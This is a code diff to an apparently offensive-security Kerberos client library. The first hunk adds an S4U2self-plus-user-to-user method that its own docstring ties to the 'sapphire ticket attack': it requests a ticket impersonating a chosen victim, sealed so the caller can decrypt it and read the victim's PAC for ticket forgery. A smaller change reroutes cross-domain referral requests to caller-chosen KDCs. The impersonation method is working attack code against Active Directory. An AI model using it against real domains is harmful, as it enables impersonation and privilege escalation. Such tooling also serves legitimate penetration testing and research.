@@ -1,6 +1,7 @@
 from __future__ import annotations
 from unicrypto import hashlib
 import collections
+import copy
 import datetime
 import secrets
 import os
@@ -730,7 +731,118 @@ class AIOKerberosClient:
 		logger.debug('[S4U2self] Got valid TGS reply')
 		self.kerberos_TGS = tgs
 		return tgs, encTGSRepPart, key
-		
+
+	async def S4U2self_U2U(self, user_to_impersonate, kdcopts = ['forwardable','renewable','canonicalize','enc-tkt-in-skey']):
+		"""S4U2self combined with user-to-user, as used by the sapphire ticket
+		attack. The service ticket for the impersonated user is requested
+		enc-tkt-in-skey against our own TGT, so the KDC encrypts it in our TGT
+		session key - which means we can decrypt it and read the victim's real
+		PAC.
+
+		user_to_impersonate : KerberosTarget / KerberosSPN naming the victim.
+		Returns (tgs, encTGSRepPart, session_key, decticket) where decticket is
+		the decrypted EncTicketPart native dict carrying the victim's PAC.
+		"""
+		if not self.kerberos_TGT:
+			logger.debug('[S4U2self_U2U] TGT is not available! Fetching TGT...')
+			await self.get_TGT()
+
+		auth_package_name = 'Kerberos'
+		now = datetime.datetime.now(datetime.timezone.utc)
+
+		authenticator_data = {}
+		authenticator_data['authenticator-vno'] = krb5_pvno
+		authenticator_data['crealm'] = Realm(self.kerberos_TGT['crealm'])
+		authenticator_data['cname'] = self.kerberos_TGT['cname']
+		authenticator_data['cusec'] = now.microsecond
+		authenticator_data['ctime'] = now.replace(microsecond=0)
+
+		authenticator_data_enc = self.kerberos_cipher.encrypt(self.kerberos_session_key, 7, Authenticator(authenticator_data).dump(), None)
+
+		ap_req = {}
+		ap_req['pvno'] = krb5_pvno
+		ap_req['msg-type'] = MESSAGE_TYPE.KRB_AP_REQ.value
+		ap_req['ap-options'] = APOptions(set())
+		ap_req['ticket'] = Ticket(self.kerberos_TGT['ticket'])
+		ap_req['authenticator'] = EncryptedData({'etype': self.kerberos_cipher_type, 'cipher': authenticator_data_enc})
+
+		pa_data_auth = {}
+		pa_data_auth['padata-type'] = PaDataType.TGS_REQ.value
+		pa_data_auth['padata-value'] = AP_REQ(ap_req).dump()
+
+		# PA-FOR-USER checksum, identical to S4U2self (see that method for the
+		# byte layout and key-usage rationale).
+		S4UByteArray = NAME_TYPE.PRINCIPAL.value.to_bytes(4, 'little', signed = False)
+		S4UByteArray += user_to_impersonate.username.encode()
+		S4UByteArray += user_to_impersonate.domain.encode()
+		S4UByteArray += auth_package_name.encode()
+
+		if self.kerberos_session_key.enctype == Enctype.AES256:
+			checksum_type = CKSUMTYPE('HMAC_SHA1_96_AES_256')
+			chksum_data = _SHA1AES256.checksum(self.kerberos_session_key, 17, S4UByteArray)
+		elif self.kerberos_session_key.enctype == Enctype.AES128:
+			checksum_type = CKSUMTYPE('HMAC_SHA1_96_AES_128')
+			chksum_data = _SHA1AES128.checksum(self.kerberos_session_key, 17, S4UByteArray)
+		elif self.kerberos_session_key.enctype == Enctype.RC4:
+			checksum_type = CKSUMTYPE('HMAC_MD5')
+			chksum_data = _HMACMD5.checksum(self.kerberos_session_key, 17, S4UByteArray)
+		else:
+			raise NotImplementedError('Unsupported S4U2self_U2U session-key enctype: %s' % self.kerberos_session_key.enctype)
+
+		chksum = {}
+		chksum['cksumtype'] = int(checksum_type)
+		chksum['checksum'] = chksum_data
+
+		pa_for_user_enc = {}
+		pa_for_user_enc['userName'] = PrincipalName({'name-type': NAME_TYPE.PRINCIPAL.value, 'name-string': user_to_impersonate.get_principalname()})
+		pa_for_user_enc['userRealm'] = user_to_impersonate.domain
+		pa_for_user_enc['cksum'] = Checksum(chksum)
+		pa_for_user_enc['auth-package'] = auth_package_name
+
+		pa_for_user = {}
+		pa_for_user['padata-type'] = int(PADATA_TYPE('PA-FOR-USER'))
+		pa_for_user['padata-value'] = PA_FOR_USER_ENC(pa_for_user_enc).dump()
+
+		# The service is our own account (the TGT owner), requested U2U against
+		# our own TGT so the reply ticket is sealed in our TGT session key.
+		krb_tgs_body = {}
+		krb_tgs_body['kdc-options'] = KDCOptions(set(kdcopts))
+		krb_tgs_body['sname'] = PrincipalName({'name-type': NAME_TYPE.UNKNOWN.value, 'name-string': self.credential.username.split('/')})
+		krb_tgs_body['realm'] = self.credential.domain.upper()
+		krb_tgs_body['till'] = (now + datetime.timedelta(days=1)).replace(microsecond=0)
+		krb_tgs_body['nonce'] = secrets.randbits(31)
+		krb_tgs_body['etype'] = [18, 17, 23]
+		krb_tgs_body['additional-tickets'] = [Ticket(self.kerberos_TGT['ticket'])]
+
+		krb_tgs_req = {}
+		krb_tgs_req['pvno'] = krb5_pvno
+		krb_tgs_req['msg-type'] = MESSAGE_TYPE.KRB_TGS_REQ.value
+		krb_tgs_req['padata'] = [pa_data_auth, pa_for_user]
+		krb_tgs_req['req-body'] = KDC_REQ_BODY(krb_tgs_body)
+
+		req = TGS_REQ(krb_tgs_req)
+		logger.debug('[S4U2self_U2U] Sending request to server')
+
+		reply = await self.ksoc.sendrecv(req.dump())
+		if reply.name == 'KRB_ERROR':
+			emsg = 'S4U2self_U2U failed!'
+			if reply.native['error-code'] == 16:
+				emsg = 'S4U2self_U2U: Failed to get ticket! Error code (16) indicates that delegation is not enabled for this account!'
+			raise KerberosError(reply, emsg)
+
+		logger.debug('[S4U2self_U2U] Got reply, decrypting...')
+		tgs = reply.native
+
+		# enc-tkt-in-skey: the service ticket is encrypted in our TGT session key.
+		cipher = _enctype_table[int(tgs['ticket']['enc-part']['etype'])]
+		decdata = cipher.decrypt(self.kerberos_session_key, 2, tgs['ticket']['enc-part']['cipher'])
+		decticket = EncTicketPart.load(decdata).native
+
+		encTGSRepPart = EncTGSRepPart.load(self.kerberos_cipher.decrypt(self.kerberos_session_key, 8, tgs['enc-part']['cipher'])).native
+		key = Key(encTGSRepPart['key']['keytype'], encTGSRepPart['key']['keyvalue'])
+		logger.debug('[S4U2self_U2U] Got valid TGS reply')
+		return tgs, encTGSRepPart, key, decticket
+
 	# https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/c920c148-8a9c-42e9-b8e9-db5755cd281b
 	async def S4U2proxy(self, s4uself_ticket, spn_user):
 		logger.debug('[S4U2proxy] Impersonating %s' % '/'.join(spn_user.get_principalname()))
@@ -994,9 +1106,51 @@ class AIOKerberosClient:
 		session_key = Key(cipher.enctype, encasrep['key']['keyvalue'])
 		return encasrep, session_key, cipher
 	
+	def _referral_target(self, realm, kdcs, is_target_domain = False):
+		"""The KDC to talk to for a realm on a referral path: the caller's own
+		target for that realm when one was given, else the realm name itself."""
+		if kdcs is None:
+			return self.target.get_newtarget(realm, port=88)
+		if isinstance(kdcs, str):
+			# an address: of the target domain's KDC only
+			if is_target_domain is True:
+				return self.target.get_newtarget(kdcs, port=88)
+			return self.target.get_newtarget(realm, port=88)
+
+		single = not isinstance(kdcs, (list, tuple))
+		if single is True:
+			kdcs = [kdcs]
+		chosen = None
+		for kdc in kdcs:
+			if kdc.domain is not None and kdc.domain.upper() == realm.upper():
+				chosen = kdc
+				break
+		if chosen is None and is_target_domain is True:
+			# a lone target, or one that names no realm, is the target domain's KDC
+			for kdc in kdcs:
+				if single is True or kdc.domain is None:
+					chosen = kdc
+					break
+		if chosen is None:
+			return self.target.get_newtarget(realm, port=88)
+		if isinstance(chosen, KerberosTarget):
+			return copy.deepcopy(chosen)
+		# some other protocol's target of that host: same host and proxies, kerberos port
+		return KerberosTarget(
+			chosen.get_ip_or_hostname(),
+			proxies = copy.deepcopy(chosen.proxies),
+			protocol = self.target.protocol,
+			timeout = chosen.timeout,
+			port = 88
+		)
+
 	async def get_referral_ticket(self, target_domain, target_ip = None, prev_sname = None):
 		"""Cross domain TGT referral"""
 		"""If target_ip is not set, the target domain will be used as the hostname for the newly created connection"""
+		"""target_ip is the address of the target domain's KDC, or a target object of it,
+		or a list of target objects for the realms on the referral path. A target object
+		is matched to its realm by its "domain" attribute; realms without one are
+		connected to by their name."""
 		from minikerberos.common.factory import KerberosClientFactory
 		from minikerberos.common.kirbi import Kirbi
 
@@ -1024,7 +1178,7 @@ class AIOKerberosClient:
 			logger.debug('The referral ticket is not for the target domain, getting new referral ticket from %s' % sname)
 			
 			kirbi = Kirbi.from_ticketdata(tgs, encpart)
-			newt = self.target.get_newtarget(sname, port=88)
+			newt = self._referral_target(sname, target_ip)
 			newc = KerberosCredential.from_kirbi(kirbi, encoding='kirbi')
 			try:
 				new_factory = KerberosClientFactory(newt, newc, newt.proxies)
@@ -1035,10 +1189,7 @@ class AIOKerberosClient:
 				raise Exception('Failed to get referral ticket from domain "%s"! Reason: %s' % (sname, str(e)))
 
 		kirbi = Kirbi.from_ticketdata(tgs, encpart)
-		target_addr = target_domain
-		if target_ip is not None:
-			target_addr = target_ip
-		newt = self.target.get_newtarget(target_addr, port=88)
+		newt = self._referral_target(target_domain, target_ip, is_target_domain = True)
 		newc = KerberosCredential.from_kirbi(kirbi, encoding='kirbi')
 		new_factory = KerberosClientFactory(newt, newc, newt.proxies)
 
